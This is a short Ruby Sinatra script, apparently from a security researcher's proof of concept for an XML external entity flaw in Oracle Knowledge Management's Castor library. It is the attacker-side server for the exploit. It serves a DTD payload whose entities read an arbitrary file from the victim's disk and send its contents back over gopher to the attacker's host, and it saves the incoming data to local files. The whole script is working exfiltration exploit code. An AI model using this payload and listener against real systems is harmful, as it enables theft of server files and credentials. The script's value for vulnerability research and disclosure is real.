#!/usr/bin/env ruby
# Oracle Knowledge Management Castor Library XML External Entity Injection Information Disclosure Vulnerability
# Found by Steven Seeley of Source Incite
#
# Notes:
# - This is the out of band xxe server that is used to retrieve the file and send it via the gopher protocol
# - ruby xxeserve.rb -o 0.0.0.0 (See README.txt)

require 'sinatra'

get "/" do
  return "OHAI" if params[:p].nil?
  f = File.open("./files/#{request.ip}#{Time.now.to_i}","w")
  f.write(params[:p])
  f.close
  ""
end

get "/xml" do
  return "" if params[:f].nil?

<<END  
<!ENTITY % payl SYSTEM "file:///#{params[:f]}">
<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'gopher://#{request.host}:1337/?%payl;'>">
END
end
